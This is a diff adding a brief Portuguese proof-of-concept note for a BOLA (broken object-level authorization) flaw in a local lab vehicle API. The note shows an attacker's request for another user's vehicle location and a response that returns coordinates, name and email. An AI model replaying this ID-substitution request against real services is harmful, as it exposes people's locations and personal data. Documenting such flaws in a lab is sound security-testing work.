@@ -1,0 +1,9 @@
+# BOLA (API1) — localização do veículo de outro usuário
+# vehicleid da vítima (vazado via Excessive Data Exposure): 4bae9968-ec7f-4de3-a3a0-ba1b2ab5e5e5
+# Requisição (token do ATACANTE):
+GET http://localhost:8888/identity/api/v2/vehicle/4bae9968-ec7f-4de3-a3a0-ba1b2ab5e5e5/location
+----------------------------------------------------------------
+# Resposta:
+{"carId":"4bae9968-ec7f-4de3-a3a0-ba1b2ab5e5e5","vehicleLocation":{"id":3,"latitude":"37.746880","longitude":"-84.301460"},"fullName":"Robot","email":"robot001@example.com"}
+----------------------------------------------------------------
+# Prova: retorna latitude/longitude + nome + email de um veículo que não é do atacante.
